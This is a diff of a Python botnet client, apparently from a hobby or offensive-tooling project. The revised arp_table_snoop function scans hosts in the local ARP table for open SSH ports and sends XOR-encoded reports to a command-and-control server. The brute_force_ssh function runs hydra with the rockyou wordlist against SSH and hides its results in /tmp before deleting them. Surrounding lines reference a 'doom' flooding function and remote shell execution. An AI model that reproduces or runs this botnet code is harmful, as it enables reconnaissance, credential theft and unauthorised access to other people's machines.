@@ -48,18 +48,62 @@ def doom(url):
 		except:
 			pass
 
-def brute_force_ssh(ip,username):#brute force attack on port 22 
+def arp_table_snoop():#sends arp table form bots' host's arp table
+	global stop
+	while True:
+		if stop :
+			break
+		with open("/proc/net/arp") as arp_table:
+			counter = 0
+			ip_addr_22_open = []
+			for line in arp_table:
+				ip_addr = ''
+				port_22_fb = ''
+				if counter >= 1:
+					line_words = line.split()
+					ip_addr = line_words[0]
+					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+					try:
+						s.connect((ip_addr, int(22)))
+					except:
+						pass
+						#print("\t Closed and lights out at port 22 on host " + ip_addr)
+					else:
+						port_22_fb += "### "+ip_addr+" has port 22 open"
+						port_22_fb_enc = (xor_enc(port_22_fb,key).encode())#encoding message to send back to cnc
+						s.close()
+						#print("\t Someone is home. Do we have a key for port 22 at " + ip_addr + "?")
+				try:
+					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+					s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+					s.settimeout(1)
+					s.connect((str(cnc),int(fb_port)))
+					s.send(port_22_fb_enc)
+					s.close()
+				except:
+					pass
+
+				counter += 1
+			#for i in ip_addr_22_open:
+				#print(i)
+		break
+
+def brute_force_ssh(ip,username,t_out):#brute force attack on port 22 
 	global stop
 	while True:
 		if stop :
 			break
 		try:
+			t_out_num = int(t_out)
+			if t_out_num <= 0 or t_out_num > 1800:
+				t_out_num = 600
 			with open('/tmp/.bfssh_results', 'wb', 0) as file:
-				subprocess.run(['hydra', '-l', username, '-P', '/usr/share/wordlists/rockyou.txt', ip, 'ssh','-t','64','-I'], stdout=file, stderr=file)
+				subprocess.run(['hydra', '-l', username, '-P', '/usr/share/wordlists/rockyou.txt', ip, 'ssh','-t','32','-I'], stdout=file, stderr=file, timeout=t_out_num)
 		except:
 			pass
 		else:
 			bf_results = ''
+			line_parse = []
 			with open('/tmp/.bfssh_results', 'r') as file:
 				for line in file:
 					line_parse = line.split(" ")
@@ -77,44 +121,6 @@ def brute_force_ssh(ip,username):#brute force attack on port 22
 							except:
 								pass
 			subprocess.run(['rm', '-rf','/tmp/.bfssh_results'])
-		break
-
-def arp_table_snoop():#sends arp table form bots' host's arp table
-	global stop
-	while True:
-		if stop :
-			break
-		with open("/proc/net/arp") as arp_table:
-			counter = 0
-			ip_addr_22_open = []
-			for line in arp_table:
-					ip_addr = ''
-					if counter >= 1:
-						line_words = line.split()
-						ip_addr = line_words[0]
-						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-						try:
-								s.connect((ip_addr, int(22)))
-						except:
-							pass
-								#print("\t Closed and lights out at port 22 on host " + ip_addr)
-						else:
-							ip_addr += " has port 22 open"
-							ip_addr_enc = (xor_enc(ip_addr,key).encode())#encoding message to send back to cnc
-							s.close()
-							#print("\t Someone is home. Do we have a key for port 22 at " + ip_addr + "?")
-						try:
-							s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-							s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-							s.settimeout(1)
-							s.connect((str(cnc),int(fb_port)))
-							s.send(ip_addr_enc)
-							s.close()
-						except:
-							pass
-						counter += 1
-				#for i in ip_addr_22_open:
-						#print(i)
 		break
 
 def shell_exec(cmd, sock):
